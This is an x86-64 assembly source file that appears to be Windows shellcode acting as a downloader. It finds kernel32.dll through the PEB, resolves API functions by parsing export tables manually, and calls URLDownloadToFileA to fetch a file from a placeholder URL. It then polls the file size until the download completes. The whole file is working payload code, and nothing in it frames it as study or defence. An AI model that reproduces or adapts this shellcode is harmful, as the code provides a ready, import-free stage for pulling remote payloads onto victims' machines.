[bits 64]

O_CREAT EQU   0x0100
O_RDWR EQU    0x0002
O_APPEND EQU  0x0008

; rbx = URLDownloadToFileA / Size of file
; rdi = msvcrt.dll / Sleep
; rsi = _stat buffer
; r12 = _stat function
; r13 = GetProcAddress
; r14 = LoadLibraryA
; r15 = Data section
section .text
  main:
    sub rsp, 6*8
    call init
    sub rax, $
    mov r15, rax            ; $rip
    mov rcx, r15
    add rcx, k32Name
    mov rdx, 11
    call getLDTE
    mov r12, rax          ; r12 = Kernel32 Image directory
    mov rcx, rax
    mov rdx, r15
    add rdx, functionName
    mov r8, 15
    call getFunction
    mov r13, rax          ; r13 = GetProcAddress
    mov rcx, [r12d + 0x30]
    mov rdx, r15
    add rdx, loadLibrary
    call rax              ; Get LoadLibraryA
    mov r14, rax          ; r14 = LoadLibraryA


    mov rcx, r15
    add rcx, dll1
    call r14              ; Load urlmon.dll
    mov rcx, rax
    mov rdx, r15
    add rdx, downloadF
    call r13              ; Get URLDownloadToFileA
    xor rcx, rcx
    mov rdx, r15
    add rdx, url
    mov r8, r15
    add r8, filename
    xor r9, r9
    push r9
    call rax              ; Download &url to &filename
    ; TODO Check return value == S_OK
    mov rcx, r15
    add rcx, dll2
    call r14
    mov rdi, rax        ; msvcrt.dll
    mov rcx, rax
    mov rdx, r15
    add rdx, mallocF
    call r13
    mov rcx, 0x2e       ; sizeof(struct _stat)
    call rax
    mov rsi, rax        ; _stat buffer
    mov rcx, rdi
    mov rdx, r15
    add rdx, statF
    call r13
    mov rcx, [r12d + 0x30]
    mov r12, rax
    mov rdx, r15
    add rdx, sleepF
    call r13
    mov rdi, rax        ; Sleep function
    xor rbx, rbx
    downloadCheck:
      mov rcx, 0x3e8    ; 1000ms
      call rdi
      mov rcx, r15
      add rcx, filename
      mov rdx, rsi
      call r12
      mov eax, [rsi + 0x14]     ; stats.st_size
      cmp rax, rbx
      je done
      mov rbx, rax
      jmp downloadCheck
      done:
        int3
    
  
  getFunction:
    push rbp
    push rbx
    push rdi
    push rsi
    push r12
    push r13
    mov r10, [rcx + 0x30] ; dll base address
    mov r9, r10
    add r9, 0x3c          ; r9 = RVA of PE signature
    mov r9d, [r9]
    mov r11, r10
    add r11, r9       ; IMAGE_NT_HEADERS
    add r11, 0x88         ; IMAGE_DATA_DIRECTORY - First one is export table
    mov r11d, [r11]
    mov r9, r10
    add r9, r11      ; r9 = IMAGE_EXPORT_DIRECTORY
    mov r12, r9           ; r12 = IMAGE_EXPORT_DIRECTORY
    mov r11, r10
    mov r9d, [r9 + 0x20]
    add r11, r9  ; Array of RVA containing functions' name
    xor rbx, rbx
    loop2:
      mov r9, r10
      mov esi, [r11 + rbx * 0x4]
      add r9, rsi
      mov rsi, r9
      mov rdi, rdx
      mov rbp, r8
      strcmp:
        cmpsb
        jne next2
        dec rbp
        xor rax, rax
        ; TODO Maybe bug here, should I check EOF ?
        cmp rbp, rax
        je retAddr
        jmp strcmp
      next2:
        inc rbx
        jmp loop2
    retAddr:
      mov r9, r10
      mov r13d, [r12 + 0x24]
      add r9, r13
      mov bx, [r9 + rbx * 2]
      mov r9, r10
      mov r13d, [r12 + 0x1c]
      add r9, r13   ; Array of RVAs
      mov r13, r10
      mov r9d, [r9 + rbx * 4]
      add r13, r9
      mov rax, r13
    pop r13
    pop r12
    pop rsi
    pop rdi
    pop rbx
    pop rbp
    ret
  getLDTE:
    push rdi
    push rsi
    mov rax, [gs:0x60]    ; PEB
    mov rax, [rax + 0x18] ; PPEB_LDR_DATA
    mov rax, [rax + 0x20] ; LIST_ENTRY/LDR_DATA_TABLE_ENTRY argv[0]
    mov rax, [rax]
    mov rax, [rax]
    sub rax, 0x10
    pop rdi
    pop rsi
    ret
  init:
    mov rax, [rsp]
    ret

section .data
  k32Name db "K", 0, "E", 0, "R", 0, "N", 0, "E", 0, "L", 0, "3", 0, "2", 0, ".", 0, "d", 0, "l", 0, "l", 0
  functionName db "GetProcAddress", 0
  user db "user32.dll", 0
  loadLibrary db "LoadLibraryA", 0
  dll1 db "urlmon.dll", 0
  dll2 db "msvcrt.dll", 0
  downloadF db "URLDownloadToFileA", 0
  statF db "_stat", 0
  mallocF db "malloc", 0
  sleepF db "Sleep", 0
  url db "https://UrlToAFile.com", 0
  filename db "./filename", 0
  end
